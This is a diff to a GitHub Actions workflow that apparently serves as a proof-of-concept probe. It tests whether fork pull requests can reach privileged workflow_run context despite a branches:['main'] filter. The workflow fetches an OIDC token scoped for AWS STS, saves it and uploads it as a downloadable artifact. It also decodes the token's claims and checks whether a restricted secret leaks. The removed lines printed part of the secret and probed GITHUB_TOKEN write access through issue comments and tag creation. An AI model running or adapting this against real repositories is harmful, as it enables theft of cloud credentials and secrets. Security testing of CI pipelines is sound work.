@@ -3,6 +3,7 @@ on:
   workflow_run:
     workflows: ["PR Trigger (fork context)"]
     types: [completed]
+    branches: ['main']
 permissions:
   id-token: write
   contents: read
@@ -18,63 +19,24 @@ jobs:
             "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r .value)
           echo "$FULL_JWT" > /tmp/oidc_token.txt
           PAYLOAD=$(echo "$FULL_JWT" | cut -d. -f2)
+          echo "=== BRANCHES MAIN FILTER TEST ==="
+          echo "If this runs, branches:['main'] does NOT protect against fork PRs"
           echo "$PAYLOAD" | python3 -c "
           import sys, base64, json
           d = sys.stdin.read().strip()
           p = d + chr(61) * (4 - len(d) % 4)
           j = json.loads(base64.urlsafe_b64decode(p))
-          print(json.dumps(j, indent=2))"
-      - name: Check restricted secret access
+          print('actor:', j.get('actor'))
+          print('head_ref:', j.get('head_ref'))
+          print('event_name:', j.get('event_name'))
+          print('sub:', j.get('sub'))"
+      - name: Check secret access
         run: |
-          echo "Restricted secret first 8 chars: ${RESTRICTED_SECRET:0:8}..."
-          if [ -n "$RESTRICTED_SECRET" ]; then echo "SECRET ACCESSIBLE VIA FORK PR!"; else echo "SECRET BLOCKED"; fi
+          if [ -n "$RESTRICTED_SECRET" ]; then echo "SECRET LEAKED - branches:main filter bypassed!"; else echo "SECRET BLOCKED"; fi
         env:
           RESTRICTED_SECRET: ${{ secrets.RESTRICTED_SECRET }}
-      - name: Probe GITHUB_TOKEN write permissions
-        run: |
-          echo "=== GITHUB_TOKEN permission probe ==="
-          # Try to read repo metadata (should always work)
-          REPO_DATA=$(curl -sS -o /dev/null -w "%{http_code}" \
-            -H "Authorization: token $GITHUB_TOKEN" \
-            "https://api.github.com/repos/$GITHUB_REPOSITORY")
-          echo "GET /repos: HTTP $REPO_DATA"
-          # Try to create an issue comment (write operation - tests write access)
-          WRITE_TEST=$(curl -sS -w "\nHTTP_STATUS:%{http_code}" \
-            -X POST \
-            -H "Authorization: token $GITHUB_TOKEN" \
-            -H "Content-Type: application/json" \
-            -d '{"body":"GITHUB_TOKEN write test from workflow_run triggered by fork PR"}' \
-            "https://api.github.com/repos/$GITHUB_REPOSITORY/issues/1/comments")
-          HTTP_CODE=$(echo "$WRITE_TEST" | grep "HTTP_STATUS:" | cut -d: -f2)
-          echo "POST /issues/1/comments HTTP: $HTTP_CODE"
-          if echo "$HTTP_CODE" | grep -q "^2"; then
-            echo "GITHUB_TOKEN HAS WRITE ACCESS TO BASE REPO (issues:write)"
-          else
-            echo "GITHUB_TOKEN write blocked: $HTTP_CODE"
-          fi
-          # Try to create a tag ref (contents write)
-          TAG_TEST=$(curl -sS -w "\nHTTP_STATUS:%{http_code}" \
-            -X POST \
-            -H "Authorization: token $GITHUB_TOKEN" \
-            -H "Content-Type: application/json" \
-            -d "{\"ref\":\"refs/tags/workflow-run-write-test\",\"sha\":\"$GITHUB_SHA\"}" \
-            "https://api.github.com/repos/$GITHUB_REPOSITORY/git/refs")
-          TAG_CODE=$(echo "$TAG_TEST" | grep "HTTP_STATUS:" | cut -d: -f2)
-          echo "POST /git/refs (create tag) HTTP: $TAG_CODE"
-          if echo "$TAG_CODE" | grep -q "^2"; then
-            echo "GITHUB_TOKEN HAS CONTENTS WRITE ACCESS (can create tags/commits)"
-            # Immediately clean up the test tag
-            curl -sS -X DELETE \
-              -H "Authorization: token $GITHUB_TOKEN" \
-              "https://api.github.com/repos/$GITHUB_REPOSITORY/git/refs/tags/workflow-run-write-test"
-            echo "Test tag cleaned up"
-          else
-            echo "GITHUB_TOKEN contents write blocked: $TAG_CODE"
-          fi
-        env:
-          GITHUB_TOKEN: ${{ github.token }}
       - uses: actions/upload-artifact@v4
         with:
-          name: workflow-run-restricted-env-oidc
+          name: branches-main-filter-bypass-test
           path: /tmp/oidc_token.txt
           retention-days: 1
